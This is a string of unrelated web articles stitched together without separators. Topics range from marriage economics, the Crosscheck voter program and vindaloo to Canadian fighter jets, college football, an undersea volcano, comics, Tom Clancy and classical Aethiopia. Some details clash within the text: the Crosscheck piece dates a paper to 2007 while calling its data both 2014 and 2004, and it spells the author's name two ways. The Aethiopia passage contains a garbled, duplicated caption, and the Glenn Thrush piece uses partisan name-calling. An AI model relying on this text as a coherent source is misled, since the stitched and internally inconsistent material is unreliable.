Perhaps nowhere is this more true than in the U.S., where, despite the growing diversity of our families, our economic structures and work policies stubbornly cater to two-parent partnerships—and don't even properly support those. Granted, some of the “stresses of middle age” that can be eased by marital friendship are probably inevitable—raising a child, caring for a dying parent, or facing the first evidence of your own impending mortality, for example, will never be easy. But, in the U.S., we seem to have all but given up on the possibility that at least one key challenge of this life stage—the fact that career and family obligations often peak at the exact same time—could, conceivably, be collectively solved. Instead, we accept ever-longer work hours, stagnating wages, astronomical child care costs, and laughable family leave policies, and then find, unsurprisingly, that more than half of working parents say it is difficult for them to balance their job and home responsibilities.
In such a context, the support offered by a spouse is not just emotional but also, often, material—a second income, another adult to pick up the kids from school, double the sick days, a much-needed benefits package. It is, in fact, even possible to estimate the exact financial price of remaining single in the U.S.
We remain remarkably, well, married to the idea that the institution can be a utilitarian silver bullet that solves the underlying structural problems of our economy—or, more accurately, a Band-Aid that masks the need to tackle them.
Of course, not so long ago, before the feminist movement ushered more women into the workforce and led to a convergence of gender roles, the benefits of marriage were imagined in even more crassly utilitarian terms. Economist Gary Becker argued that through marriage, women gained a breadwinner, and men were provided a housewife. And despite how thoroughly we've embraced the more romantic notion that marriage should be a partnership of soul-mates in our popular culture, we remain remarkably, well, married to the idea that the institution can be a utilitarian silver bullet that solves the underlying structural problems of our economy—or, more accurately, a Band-Aid that masks the need to tackle them.
This is particularly true of the rhetoric that surrounds marriages among the least privileged. Conservatives wring their hands over the marriage gap between the rich and poor and claim that single mothers, who are disproportionately likely to live in poverty, need husbands rather than a living wage and a more robust social safety net. Last summer, a Heritage Foundation panel concluded that if women would just get married, income inequality could be eliminated. And this is an idea we've tested by wasting nearly a billion dollars over the past decade on federal marriage promotion programs that have utterly failed.
Meanwhile, on the opposite end of the income spectrum, the debate about “having it all” (largely sparked by Anne-Marie Slaughter's Atlantic piece a couple of years ago)—which, in a sane world, might have led to a widespread movement to reduce work hours and join everyone else in enacting mandatory paid family leave—seems to have quietly wound down with the tepid conclusion that nobody can have it all. Apparently, the best we can hope for is a good marriage to make things a tiny bit easier. As Ruth Bader Ginsburg said in a recent interview with Katie Couric: “You can't have it all all at once. Over my lifespan, I think I have had it all, but in given periods in time, things were rough. And if you have a caring life partner, you help the other person when that person needs it.”
Even when we're not making such an explicitly economic case for coupledom, we prescribe marriage as though finding a life partner were as easy as flipping a switch. See, for example, the New York Times' take-away from this latest study: “Overall, the research comes to a largely optimistic conclusion. People have the capacity to increase their happiness levels and avoid falling deep into midlife crisis by finding support in long-term relationships.” As always, in our up-by-your-bootstraps, self-help culture, the only thing standing in the way of your happiness is you.
Never mind that, as this study shows, who you marry is pretty damn important. And never mind that it takes time to cultivate good relationships, romantic or otherwise, temporary or life-long—and time is something that's in short supply. Indeed, the cruelest irony here might be that the low-income Americans most targeted by our marriage promotion efforts have the least control over their time. When you're napping in your car in between multiple part-time, low-wage jobs, I'm not sure when exactly you're supposed to kiss enough frogs to find your very own “super-friend.”
If we truly took to heart the importance of close social ties to our well-being—which the research certainly supports—instead of pushing marriage as a means of weathering the stresses caused by our current economy, we might build a better one that allows for all types of relationships to flourish in the first place.

President Trump, accompanied by Vice President Pence, right, and Kansas Secretary of State Kris Kobach, center left, speaks at the first meeting of the Presidential Advisory Commission on Election Integrity. (Jabin Botsford/The Washington Post)
At the inaugural meeting of President Trump's election integrity commission on Wednesday, commission Vice-Chairman Kris Kobach of Kansas praised a data collection program run by his state as a model for a national effort to root out voter fraud.
States participating in the program, known as the Interstate Crosscheck System, send their voter registration files to Kansas. Kansas election authorities compare these files to those from other states. Each participating state receives back a list of their voter registrations that match the first name, last name and date of birth of a voter in another state. States may act upon the findings as they wish, although Crosscheck provides some guidelines for purging voter registrations from the rolls.
In theory, the program is supposed to detect possible cases of people voting in multiple locations. But academics and states that use the program have found that its results are overrun with false positives, creating a high risk of disenfranchising legal voters. A statistical analysis of the program published earlier this year by researchers at Stanford, Harvard, University of Pennsylvania and Microsoft, for instance, found that Crosscheck “would eliminate about 200 registrations used to cast legitimate votes for every one registration used to cast a double vote.”
Kobach's championing of Crosscheck is one reason many voting rights advocates are concerned that President Trump's voter fraud commission may be a vehicle for recommending mass voter purges.
The program, known as the Interstate Crosscheck System, has been plagued by data quality issues. Three states have recently left it, citing accuracy issues.
But Kobach, who also serves as Kansas's secretary of state and is running for governor in 2018, remains undeterred. In his opening remarks before the election commission he said the Crosscheck program “illustrates how a successful multistate effort can be in enhancing the integrity of our elections and in keeping our voter rolls accurate. I'm confident that this commission will be equally successful on the national level.”
How does a program that claims to be getting it right end up so often getting it wrong?
Crosscheck bases its “matches” primarily on just two factors: people's first and last names and their birth date. But in a country of 139 million voters, you're guaranteed to have tens of thousands of individuals who share both names and birthdays.
For instance, in a 2007 paper, elections experts Michael McDonald and Justin Levitt examined voter files from New Jersey's 2014 elections. In those elections, the most common names — William Smith, Maria Rodriguez, etc. — showed up hundreds of times, reflecting their prevalence in the general population.
Shared birthdays are even more common — statistically speaking if you have a group of just 23 people, there's a greater than 50 percent chance that at least two of them will share the same birthday.
At 180 people, according to McDonald and Levitt, there's a 50 percent chance that two of them will share the same birth date — month, day and year.
So if you have 282 William Smiths, as in New Jersey's voter rolls in 2004, you'd expect four of them to share the exact same birthday. Those four William Smiths would be flagged as potentially fraudulent voters by Kobach's Crosscheck system.
The problems don't stop there. Voter files are notoriously messy and often incomplete. Among the 3.6 million New Jersey voters McDonnell and Levitt analyzed, for instance, nearly 1 million were missing a birth date completely. Ten thousand were listed with a birth date of Jan. 1, 1753, and another 20,000 listed as Jan. 1, 1800 — likely placeholder values that were never updated.
Multiply those figures up to the national level, and you can see how a system that naively matches names and birth dates is going to return a lot of noise — and very, very little in the way of people actually trying to game the voting system.
There's no question that incomplete voter data is a problem. But comparing incomplete data sets against each other isn't likely to solve that problem.
To its credit, the Crosscheck program recognizes some of these shortcomings. After primary matches are determined using name and birth date, it attempts to match additional fields including partial Social Security numbers, if such data is available.
But that's far from fail-safe. A working paper published this year by researchers at Stanford, Harvard, University of Pennsylvania and Microsoft quantified some of the problem. In 2012 and 2014, Crosscheck sent the state of Iowa information on nearly 240,000 voter registrations that shared a name and a date of birth with a voter in another state.
Building off McDonnell and Levitt's work, the researchers created a sophisticated model that incorporated the likelihood of shared names and birthdays, factored in Social Security number data where available, attempted to determine if both shared-name pairs actually voted in a given year, and accounted for clerical errors.
Boiling it all down, out of the 240,000 paired registrations that Crosscheck sent to Iowa, there were only six cases where it appeared that the same person registered and voted in two different states.
In other words, well over 99 percent of the 'matches' sent to Iowa were unlikely to have anything to do with even attempted voter fraud.
Incidentally, that's in line with Kobach's prosecution record on Crosscheck cases: a grand total of nine successful convictions so far, “mostly older Republican males,” according to local media reports.
The other issue identified in the working paper is that Crosscheck's user guide recommends purging older voter registrations when the name and partial Social Security number match the name and SSN of a more recent registration.
Based on their research, the Harvard, Stanford, University of Pennsylvania and Microsoft team estimate that following this guideline would result in 200 deletions of legitimate voter registrations for each real-world case of double voting it prevented.
Again, Crosscheck acknowledges some of these shortcomings. “Experience in the Crosscheck program indicates that a significant number of apparent double votes are false positives and not double votes,” according to the program's 2014 user guide. “Many are the result of errors — voters sign the wrong line in the poll book, election clerks scan the wrong line with a bar code scanner, or there is confusion over father/son voters (Jr. and Sr.).”
Which begs the question: If the system is primarily a vehicle for false positives, why bother using it at all?
A number of states have decided it's not worth it. Oregon, Washington and Florida bailed on the program in recent years, citing the data problems. While 28 states still use the program, according to the Kansas secretary of state's office, others have looked at it and decided it's not for them.
Minnesota's one of them. “After looking at the data” on Crosscheck, “there is an unacceptably high risk of false positives,” said Secretary of State Steve Simon, who reviewed the program after taking office in 2015.
Along with 18 other states plus D.C., Minnesota has instead opted to join the Electronic Registration Information Center (ERIC), a separate voter data program started in 2012. ERIC draws on a much wider array of data sources than Crosscheck, including motor vehicle registration data, Social Security death records, and Postal Service data.
“Look at what ERIC's doing. That's the way you clean up the voting rolls,” Simon said. “It's anonymized data, and you don't have nearly the problem with false positives.”
The program has earned already high marks from Democratic and Republican states alike. Independent elections experts speak highly of it as well.
Because of the breadth of data it draws on, ERIC can identify errors in voter files — it's identified over 6 million incorrect or outdated registrations to its member states so far.
Unlike Crosscheck, it also helps states sign up people who are eligible to be registered to vote but aren't. From a political standpoint, that alone makes the program much less controversial than its competitor.
But the naming of Kobach to President Trump's voter fraud commission ensures that Crosscheck will continue to have a role in the spotlight this year. And if the Republican Party has its way, Crosscheck will expand — the 2016 GOP party platform called for “every state to join the Interstate Voter Registration Crosscheck Program to keep voter rolls accurate and to prevent people from voting in more than one state in the same election.”
In England, vindaloo is a tongue-searing curry, but it wasn't always that way. The word vindaloo is a garbled pronunciation of the popular Portuguese dish carne de vinha d'alhos (meat marinated in wine-vinegar and garlic), which made its way to India in the 15th century along with Portuguese explorers. The dish was tweaked to local conditions: There was no wine-vinegar in India, so Franciscan priests fermented their own from palm wine. Local ingredients like tamarind, black pepper, cinnamon, and cardamom were also incorporated. But the most important addition—chile peppers—was a legacy of Portugal's global empire, imported to India from the Americas. When the British occupied India from 1797 to 1813, they were delighted to discover this East-meets-West food, as well as Christian Goan cooks, who, free of caste and religious restrictions, were happy to make beef and pork dishes beloved by expats. In early British India cookbooks, vindaloo recipes remained close to the Goan original. But the dish gradually met the same fate as many Indian dishes when it was exported to England: It became another hot curry. The tang of vinegar disappeared along with the practice of marinating the meat, and the balance of different spices was lost under a blistering excess of chiles. Luckily, in Goa many versions still hark back to old days when cinnamon and cardamom provided an earthy elegance, and the heat was kept in check.

A pop-up on Buchanan Street NW. A pop-up on Buchanan Street NW.
Councilmember Vincent Orange floated emergency legislation on Thursday that would ban all pop-ups and conversions in single-family and two-unit houses across DC.
The legislation is unlikely to go anywhere, Greater Greater Washington's David Alpert points out in a scathing post, because the Zoning Commission, not the Council, deals with zoning issues in the city.
And the Zoning Commission has already taken action on pop-ups. On March 30, the Commission voted to reduce the allowable height in R-4 districts to 35 feet. The Commission's vote is now undergoing review and will, in all likelihood, be made final soon. Orange's legislation presents itself as a stopgap measure until the Commission's changes are made final.
But his proposed legislation goes much further than the Zoning Commission's changes. Orange would have DCRA stop issuing permits on conversions with three or more units and any pop-ups immediately, “to maintain the status quo until needed regulations are developed.” The councilmember makes no distinction between R-4 neighborhoods and other neighborhoods, meaning the prohibition would apply to all single-family and two-unit houses city-wide.
Orange's proposals will be addressed in a council meeting on April 14.

“Donald supported the invasion of Iraq” — Clinton
“Wrong.” — Trump
Trump was supportive of the Iraq invasion as far back as 2002, according to interviews the Donald did with Howard Stern, which were first uncovered by BuzzFeed. Stern asks Trump if he agreed with the Bush administration trying to sell the war. He said, “Yeah, I guess so.”
The argument between Clinton and Trump then spilled over into a clash of words between Trump and moderator Lester Holt. Holt insisted Trump had supported the war, referencing the Stern interview.
Trump then claimed he'd had arguments with Fox News televsion host Sean Hannity, in which he argued against the war. He also said the argument that he supported the war was a media "lie."
He also cited a 2004 Esquire interview that mentioned his criticism of the Iraq invasion as proof of his opposition. That interview took place after the start of the war, and Esquire has since attached a note to the article arguing that Trump is misrepresenting its contents.

A seven-member federal cabinet committee is drawing up final options to replace Canada's aging fighter jets, sources say – and the ministers include Transport Minister Marc Garneau, who openly advocated against the purchase of Lockheed-Martin F-35s in recent years.
Government officials said the cabinet committee is working to refine the choices that will eventually be put in front of the full cabinet, where there will be a debate before the government makes a final call. The acquisition of the new fighter jets is estimated to cost at least $9-billion, plus decades of maintenance and operation costs.
"We may have no bigger or more complex [decision to make] this mandate," a senior Liberal official said.

The Liberals promised in last year's election campaign not to buy the F-35, but once in government, they committed to holding an "open and transparent" competition to select the new aircraft.
However, the government has been putting growing emphasis in recent weeks on the "urgent" need to find a replacement for the three-decade-old fleet of CF-18s, and critics, including Conservatives, accuse the Liberals of rigging the process to purchase a fleet of Boeing Super Hornets at the expense of the F-35. That aircraft had long been championed by the previous government.
Retired lieutenant-general Ken Pennie, who is a former head of the Air Force, said he hopes the government will make its choice based on the need to protect the country's territory instead of political considerations.
"I think there should be a competition based on the requirement to defend Canada," he said in an interview. "I don't know what that requirement is today, but it has to be something that will be effective against what the Russians are going to put on the table in the next 20, 30, 40 years."
Sources said the file is currently in front of the cabinet "ad hoc" committee on defence procurement, which is chaired by Natural Resources Minister Jim Carr.
The other members of the committee are Treasury Board President Scott Brison, Defence Minister Harjit Sajjan, Procurement Minister Judy Foote, Innovation Minister Navdeep Bains, Science Minister Kirsty Duncan and Mr. Garneau.
When he was in opposition, Mr. Garneau repeatedly slammed the F-35 for having a single engine, saying the aircraft would put pilots at risk in the event of engine failure in the Arctic. The Super Hornet, while featuring older technology than the F-35, has two engines.

"All things being equal, two engines are better than one," Mr. Garneau said in 2011.
Mr. Garneau added the manufacturer should have to guarantee that 100 per cent of the value of its aircraft would be reinvested in Canada. The F-35 project does not include traditional regional benefits, but rather opportunities for Canadian firms to bid on work for the aircraft's international production line.
"We know we can get a better deal for Canadians, with guaranteed offsets," Mr. Garneau said at the time.
During Question Period on Tuesday, Prime Minister Justin Trudeau was critical of the F-35, which has faced delays and technological challenges in recent years, as an aircraft "that doesn't work."
Former CF-18 pilot Billie Flynn, who now works for Lockheed-Martin as an F-35 test pilot, disputed the Prime Minister's characterization. In an interview on Wednesday, Mr. Flynn said the so-called "fifth-generation" F-35 is already operational with the U.S. Marine Corps, meaning it could "go to war" right away.
"The F-35 is better, more capable than any fourth-generation aircraft that flies today, period," Mr. Flynn said.

He added the F-35 beat out the Super Hornet and other fighter jets in a recent competition in Denmark, not only in terms of technical capabilities, but also cost.

ANN ARBOR -- Jim Harbaugh ripped more than a few people Tuesday in
Speaking on the satellite camp ban for the first time since it was announced late last week, Michigan's head coach slammed the SEC, the ACC and the NCAA for a "knee-jerk" decision to remove the camps. A decision, in his opinion, that will hurt "thousands and thousands" of prospective student-athletes. He also went after Ole Miss coach Hugh Freeze, who had commented earlier in the week that he was in part against satellite camps because he valued his vacation time. "You've got a guy sitting in a big house, making $5 million a year, saying he does not want to sacrifice his time," Harbaugh said. "That is not a kindred spirit to me. What most of these coaches are saying is they don't want to work harder." On Wednesday morning, Freeze -- speaking with ESPN's Mike & Mike -- took the chance to respond. He says he works plenty hard, and he's not on board with Harbaugh's decision to blast other college football coaches publicly. "I probably should've said that a little differently, but I'll never apologize for wanting to be a father and a husband," Freeze said when asked about vacation time. "I miss enough volleyball games (and other things), that is a priority for me. ... I think we work very hard, I don't think working hard is an issue. If you're asking me if I want to add more nights away from my wife and kids, I do not. That window is closing for me to be a husband and a father and I think the kids that play in our system need to see me in that role an awful lot. "I've been very complimentary of coach Harbaugh and him thinking out of the box. But we're probably not a kindred spirit in regards to making comments toward other coaches in our great profession in public forums like he has done. We're not real kindred in that regard. But I have great respect for the way he challenges and thinks outside the box. He's done some neat things." Freeze, of course, isn't the only SEC coach Harbaugh's ripped directly. He's gone after both Georgia coach Kirby Smart and Tennessee coach Butch Jones via Twitter in recent months. On the topic of the satellite camps, though, Freeze said he believes the SEC's pushback against it came for two reasons: Coaches did want to protect their free time and they valued relationships with other coaches in the region too much to intrude on their territory. Freeze also said he believed that schools who came down south for satellite camps "are really only coming down for one or two kids." Additionally, he said regional bias plays a factor. "Your view is skewed by your region, your location, your circumstances and your conference. That's the truth of it," Freeze says. "I value the relationships I have with coaches in this profession and the last thing that I would want to do is for us to start trying to setup camps in each other's backyards. ... We're still going to offer the same scholarship numbers. No one is talking about the current recruiting calendar, which is setup where we're getting ready to enter a six-week evaluation period and coaches can go anywhere they want to evaluate kids. "I was a high school coach and I've talked to many high school coaches and there are many that are in favor of us not doing this because of the saturation it would take. ... And the pressure it would put on a kid to specialize. What about summer baseball? What about kids that want to do other things? ... I understand the argument from the other side, but there's also the argument where a high school coach would say 'you've got six weeks to evaluate my kids in the spring and another period in the fall ...' in most cases, coaches are going to bring kids to a campus." Freeze says the one issue he has with the camp ban is that it now prohibits non-power five schools from visiting other major conference camps, something he said he has practiced during his time at Ole Miss.

Scientists recently discovered that Tamu Massif, an underwater volcano that measures more than 120,000-square miles, is a single shield volcano. It is the largest on Earth, and among the largest in the entire solar system.
Located about 1,000 miles off the coast of Japan, the base of this Pacific Ocean volcano is about four miles below sea level, though scientists believe it was just below the surface as it formed some 145 million year ago. University of Houston professor William Sager has been studying the underwater mountain range for more than 20 years, but could only recently designate Tamu Massif as a single volcano. His research is published in the current issue of the journal Nature Geoscience.
Previously, it was debated whether Tamu Massif was a complex of volcanoes or one single volcano. An example of a volcano complex is Hawaii's Big Island, which features four volcanoes.
Before the discovery of Tamu Massif, Hawaii's Mauna Loa was considered the largest active volcano on Earth. But Mauna Loa's 2,000 sqaure miles pale in comparison to Tamu Massif's 120,000. Another volcano in the same range as Tamu Massif is also massive -- about 30,000 square miles, according to Sager, but scientists need to study Ori Massif further before they can definitively say if it is an individual volcano or a complex.
Tamu is named for Texas A&M University, where Sager was working when he first started studying the mountain range, he told CBSNews.com. Other mountains in the range are named for Japanese and Russian research facilities that were collaborating with Texas A&M at the time.
"This mountain range had been known for generations, and we knew there was this big mountain mass there," Sager said. "The new thing here is that we didn't know anything about its structure, we didn't have seismic gear that could penetrate it."
Sager said their best guess was always that Tamu Massif was a complex of volcanoes. But in 2009, his team set out to study the volcano using the tools aboard the Marcus G. Langseth, a one-of-a-kind research vessel equipped with seismic imaging gear. "The ship is our version of a space telescope," Sager said.
If it was a complex, the lava flows on Tamu Massif would have pointed to multiple centers. But that wasn't what they saw.
"The patterns went up flanks to center," Sager recalls. "That's when we realized this is really one big volcano."
The team also drilled 170-meters into the flank of the volcano.
"It's like pin-pricking the elephant," says Sager. "We analyzed the lava flows, which were as much as 75 feet thick, and were also able to take that information and match it to the seismic images."
Samples taken from the top of the volcano indicate that it once sat in shallow water, but never quite rose above sea level. They believe the volcano formed over the course of one to two million years.
Further research is needed to understand why it never reached above sea level.
"It formed on a series of mid open ridges, like Iceland," said Sager. Iceland rose above sea level because it was pushed up by the broad swell of hot material, or magna, that sits beneath it, he explained.
"We would've thought the same thing would happen here. We were thinking it must've been sticking up but there's no smoking gun, no evidence that it ever stuck up. It's tantalizing because it should've been. There's something important that we need to understand."
Continued research could also show that there are still dead volcanoes even larger than Tamu Massif, he added. "This isn't the biggest oceanic plateau. We just don't know the structure of the inside of the Ontong Java Plateau yet. We expect it's a complex of volcanoes, but it could be just one. And then that would be the biggest."
New York Times Hires Self-Described “Hack” Glenn Thrush
Despite all the recent hysteria about fake news, it looks like a top purveyor will be doubling down on it. The New York Times has hired Glenn Thrush to cover the White House.
WikiLeaks revealed that while at Politico, Thrush sent stories to Clinton staffers for approval before publication.
“We're thrilled that Glenn Thrush is joining The Times,” Elisabeth Bumiller, The New York Times' Washington bureau chief, told The Huffington Post. “He's a premier political journalist, a master of breaking news and long-form story telling and a stellar addition to our White House team.”
Story telling. That sounds right.

In leaked emails, Thrush describes himself as a hack.
“No worries Because I have become a hack I will send u the whole section that pertains to u,” Thrush wrote to [top Hillary henchman John] Podesta in an April 2015 email. “Please don't share or tell anyone I did this Tell me if I f***ed up anything.”
Podesta replied that he had “no problems” with Thrush's coverage. The approved material appeared in story entitled “Hillary's Big-Money Dilemma.”
Shrillary's Director of Communications Jennifer Palmieri was also furtively given a chance to look over Thrush's writings for anything that might be deemed unhelpful. The published story included the line, “Palmieri (who laughed off a request to participate in this story) enjoys a good relationship with reporters.” I'll say.
There will be no need for Thrush to get approval from these folks going forward. No doubt everything he has to report will suit them fine, despite the recent promise by Public Editor Liz Spayd that the Slimes would try not to be such “an echo chamber of liberal intellectualism” but rather “an honest reflection of reality.”
Thrush will help bring you all the news liberals see fit to print.

Marvel has released their latest teaser image exclusively to Comicbook.com, offering the possible return of the early 90's-era X-Men team. Anchored by Wolverine, Cyclops, Storm, Jubilee, Beast, Jean Grey, and lots (and lots) of pouches, the X-Men of the early 90s were one of the franchise's most prevalent in pop culture. X-Men #1, published in 1991, still holds the world record for the highest-selling comic with almost four million copies sold, and X-Men the animated series, which ran from 1992 to 1997, still remains a fan-favorite take on the characters.
Today's image continues Marvel's long line of teasers—now more than a dozen—hinting the possible return of past storylines and series. While the previous teasers, from Civil War to Inhuman, have targeted consolidated storylines, X-Men '92 is the most wide-ranging teaser yet. The possible return of the Jim Lee-designed team wouldn't be out of the question for Marvel. They've already brought the First Class X-Men to the modern era through time travel, so why not pluck a few more past iterations of their mutants? It could be a backdoor way of bringing the recently-expired Wolverine back to their publishing fold. Indeed, they already pulled that trick with Jean Grey in "All-New X-Men."
But maybe the return of the nineties-era squad is thinking too small. What if Marvel plans to export the entire animated series universe into their publishing line? The classic Spider-Man animated series (and the current Ultimate Spider-Man cartoon) are already crossing into the 616 universe via "Spider-Verse." Marvel may have enough faith in the move's success that they're already set to replicate the formula. The most likely possibility, however, is a brief return for the Secret Wars mega event hitting the Marvel Universe next year. After all, the image includes the same “2015” banner that every other teaser has bared. That link alone must mean that it's part of a larger initiative. Plus, let's not forget the Secret Wars teaser image from New York Comic Con, featuring Marvel characters from every decade clashing with one another.
Answers are likely to come soon. Until that time, let's revel in mutant's heyday with the animated series' classic Japanese opener.
Stay tuned to Comicbook.com for more updates on Marvel's ongoing teaser campaign.
A PAIR of first century bronze statues about to be sold on the black market have been recovered by police in Jaen.
The Roman figures, valued at six million euros each, were taken from the ancient Roman site of Sacilis Marcialis and are believed to form part of the Castor and Polix sculpture in Cordoba.
The statues, 1.50m and 1.30m in size, depict two naked males, with each piece weighing about 30 kilos and in a good state of conservation, although one has lost part of his chest and the other his genitals.
Police managed to trace the figures to a finca in Pedro Abad, in Cordoba, owned by two brothers who were planning to sell them for half their value.
According to police commissioner Daniel Salgado they were about to be sold on the black market to an Italian buyer via an intermediary.
Interpol are now hunting for the buyer.
One of the brothers has also been arrested and two other people charged with a crime against heritage and the attempted smuggling of historic property.
The statues will now be taken to the Cordoba Museum to be restored.
Last month, author Tom Clancy died of heart problems at the age of 66. Clancy was a prodigious novelist and father of the modern “techno-thriller.” His works are known and enjoyed for their close attention to detail, and for their pre-9/11 glimpses into the veiled worlds of the intelligence community and military special operations. Clancy obviously took liberties with his spy teams and commando units, but they feel plausible even today, when SEAL Team 6 is a name so well known that Disney tried for a piece of the “brand.”
Fictional Counterterrorism that wasn't all fiction
Consider perhaps Clancy's most popular black operations unit: Rainbow. The fictional counterterrorism force took its name from the very real “Rainbow” war plans of the 1940s. Previously, the United States assigned a color to every country in the world with which we might do battle. Great Britain, for example, was assigned the color red, and War Plan Red was our contingency plan to wage war against them. (For the record, the plan assumed that Britain would use Canada—“Crimson”—as a staging area. Accordingly, the U.S.—or “Blue,” as we were always colored—would preemptively invade Canada and seize key ports. Meanwhile, though the Royal Navy would give Britain the short-term advantage, the U.S. would work to starve Britain out with a naval blockade.)
By 1939, it became clear to everyone involved that if the U.S. really would go to war, it would do so on many fronts, alongside many allies and against many enemies at once. For that reason, War Plans Red, Crimson, Green (Mexico), Yellow (China), Orange (Japan) and so on, were replaced with five Rainbow plans. Rainbow 1 was a defensive war in the western hemisphere in which the U.S. could count on no allies for support. Rainbow 5, which would become our planning foundation for World War II, assumed that Britain and France would be our allies, and that we would fight together in Europe and Africa.
Though the U.S. eventually outgrew the Rainbow plans, Clancy bought the name back, plus one, in Rainbow Six and conceived of an international counterterrorism unit made up of the best commandos from the United States, England (where the unit was based), and other countries from NATO. Even here, there is something to be drawn from recent history. From the start of the war on terror, special operations forces from the U.S., Canada, Australia, New Zealand, and England—to name only a few countries—have worked closely together in task forces and on missions. Task Force K-Bar, for example, one of the initial and highly decorated special operations forces on the ground in Afghanistan, had U.S. Navy SEALs, Australian SAS, and members of Canada's Joint Task Force 2 crawling around the Arma Mountains in the south.
From the start of the war on terror, special operations forces from the U.S., Canada, Australia, New Zealand, and England—to name only a few countries—have worked closely together in task forces and on missions.
Such ongoing multinational operations are nothing new. U.S. Army Special Forces itself traces its lineage to the 1st Special Service Force of World War II, which was a joint U.S.-Canada commando outfit that fought in Italy and France. (The unit's insignia—a red arrowhead—remains the defining symbol of SOF today, and when the Special Forces “long tab” was created in 1983, combat veterans of the 1st Special Service Force were awarded it retroactively.) Much later, during the Vietnam War, a Special Forces captain named Charlie Beckwith served with the British 22 Special Air Service Regiment as liaison officer. He was astonished by the competence and capabilities of the SAS, and upon returning to the United States pushed for the creation of a comparable American direct-action unit. In 1977, his request was acceded to, and Delta Force was formally established.
From SAS to Special Forces
But even before that, Beckwith took the lessons that he learned from the SAS and applied them to Special Forces. To earn a tan beret with regimental crest, members of the SAS were forced to submit to a grueling selection and qualification course that tested their minds and bodies, and an interview process that tested their character. (An example question he cites in his book: “You're off on a four-man patrol and one of the troop disobeys an order and you determine that you will, on returning to base, report him. But on the way back, something happens: you are discovered and during the firefight he saves your life and is the most heroic individual in the troop. While they're pinning the Victoria Cross on this chap, do you report him for being insubordinate?”) Beckwith soon lamented that to earn his green beret, he had to do no such thing. “I got assigned to Special Forces and put the hat on,” he said. That would change in a big way, with Beckwith establishing what would become the modern Special Forces Qualification Course, and its challenges that few mortal men can overcome.
Such is the history that Tom Clancy brought to his fiction. His units, their training, and their missions all had the fantastical elements of any good thriller, but were given depth by the real lessons learned by the U.S. military, and grounded with the gritty details of modern warfare. The literary world is the poorer to have seen the last of his novels. As for his plots: let's hope they never come true. But if they do, the units whose stories from which he drew will be there on the front lines.
This article is about the Classical Greek term. For the modern country, see Ethiopia
Libya (Africa) is imagined as extending no further south than the Horn of Africa, terminating in uninhabitable desert. All peoples inhabiting the southernmost fringes of the inhabitable world are known as Ethiopians (after their dark skin). At the extreme south-east of the continent are the The inhabited world according to Herodotus (Africa) is imagined as extending no further south than the Horn of Africa, terminating in uninhabitable desert. All peoples inhabiting the southernmost fringes of the inhabitable world are known as(after their dark skin). At the extreme south-east of the continent are the Macrobians , so called for their longevity.
Ancient Aethiopia (Greek: Αἰθιοπία Aithiopia) first appears as a geographical term in classical documents in reference to the upper Nile region, as well as certain areas south of the Sahara desert. Its earliest mention is in the works of Homer: twice in the Iliad,[1] and three times in the Odyssey.[2] The Greek historian Herodotus specifically uses the appellation to refer to such parts of Africa as were then known within the inhabitable world.[3]
In classical antiquity, Africa (or Ancient Libya) referred to what is now known as the Maghreb and south of the Libyan Desert and Western Sahara, including all the desert land west of the southern Nile river. Geographical knowledge of the continent gradually grew, with the first century AD Greek travelogue the Periplus of the Erythraean Sea describing areas along the Red Sea (Erythraean Sea). The Greek name Αἰθιοπία (from Αἰθίοψ, Aithiops, 'an Ethiopian') is a compound word, derived from the two Greek words, from αἴθω + ὤψ (aitho "I burn" + ops "face"). According to the Perseus Digital Library, the designation properly translates as Burnt-face in noun form and red-brown in adjectival form.[4] It was used as a vague term for dark-skinned populations since the time of Homer.[5][6] It was applied to such dark-skinned populations as came within the range of observation of the ancient geographers i.e. primarily in what was then Nubia, and with the expansion of geographical knowledge, successively extended to certain other areas below the Sahara.
Before Herodotus [ edit ]
Homer (c. 8th century BC) is the first to mention "Aethiopians" (Αἰθίοπες, Αἰθιοπῆες); he mentions that they are to be found at the east and west extremities of the world, divided by the sea into "eastern" (at the sunrise) and "western" (at the sunset). In Rhapsody A of the Iliad, Thetis visits Olympus to meet Zeus, but the meeting is postponed, as Zeus and other gods are absent, visiting the land of the Aethiopians. Hesiod (c. 8th century BC) speaks of Memnon as the "king of Aethiopia".[citation needed]
In 515 BC, Scylax of Caryanda, on orders from Darius I of the Achaemenid Empire, sailed along the Indus River, Indian Ocean and Red Sea, circumnavigating the Arabian Peninsula. He mentioned "Aethiopians", but his writings on them have not survived. Hecataeus of Miletus (c. 500 BC) is also said to have written a book about Aethiopia, but his writing is now known only through quotations from later authors. He stated that Aethiopia was located to the east of the Nile, as far as the Red Sea and Indian Ocean; he is also quoted as relating a myth that the Skiapods ("Shade feet") lived there, whose feet were supposedly large enough to serve as shade.[citation needed]
In Herodotus [ edit ]
In his Histories (c. 440 BC) Herodotus presents some of the most ancient and detailed information about "Aethiopia".[3] He relates that he personally traveled up the Nile to the border of Egypt as far as Elephantine (modern Aswan); in his view, "Aethiopia" is all of the inhabited land found to the south of Egypt, beginning at Elephantine. He describes a capital at Meroë, adding that the only deities worshipped there were Zeus (Amun) and Dionysus (Osiris). He relates that in the reign of Pharaoh Psamtik I (c. 650 BCE), many Egyptian soldiers deserted their country and settled amidst the Aethiopians.
Herodotus tells us that king Cambyses II (c. 570 BC) of the Achaemenid Empire sent spies to the Aethiopians "who dwelt in that part of Libya (Africa) which borders upon the southern sea." They found a strong and healthy people. Although Cambyses then campaigned toward their country, by not preparing enough provisions for the long march, his army completely failed and returned quickly.[citation needed]
In Book 3, Herodotus defines "Aethiopia" as the farthest region of "Libya" (i.e. Africa): "Where the south declines towards the setting sun lies the country called Aethiopia, the last inhabited land in that direction. There gold is obtained in great plenty, huge elephants abound, with wild trees of all sorts, and ebony; and the men are taller, handsomer, and longer lived than anywhere else."[7]
Other Greco-Roman historians [ edit ]
The Egyptian priest Manetho (c. 300 BC) listed Kushite (25th) dynasty, calling it the "Aethiopian dynasty". Moreover, when the Hebrew Bible was translated into Greek (c. 200 BC), the Hebrew appellation "Kush, Kushite" became in Greek "Aethiopia, Aethiopians", appearing as "Ethiopia, Ethiopians" in the English King James Version.[8]
Agatharchides provides a relatively detailed description of the gold mining system of Aethiopia. His text was copied almost verbatim by virtually all subsequent ancient writers on the area, including Diodorus Siculus and Photius.[9]
